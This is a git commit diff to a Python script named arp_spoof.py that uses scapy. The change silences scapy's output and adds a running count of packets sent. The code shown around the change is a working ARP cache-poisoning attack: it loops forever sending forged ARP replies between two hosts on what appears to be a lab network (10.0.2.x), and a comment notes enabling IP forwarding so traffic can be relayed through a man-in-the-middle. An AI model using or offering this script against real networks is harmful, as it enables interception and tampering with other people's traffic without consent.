19fc0f9c0ac4cb09834d2472bfa3c657f4081c78
Rosenmatt1 <rosenmatt1@gmail.com>
2021-01-29 22:53:28 -0500

    Added an elegant print that replaces previous print with sys

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import scapy.all as scapy
 import time
+import sys
 
 scapy.ls(scapy.ARP) #in terminal
 #pdst is the ip of the target computer
@@ -23,12 +24,16 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
+sent_packets_count = 0
 while True:
     spoof("10.0.2.3", "10.0.2.1")
     spoof("10.0.2.1", "10.0.2.3")
+    sent_packets_count = sent_packets_count + 2
+    print("\r[+] Packets sent" + str(sent_packets_count)),
+    sys.stdout.flush()
     time.sleep(2)
 
 # terminal will require > echo 1 > /proc/sys/net/ipv4/ip_forward
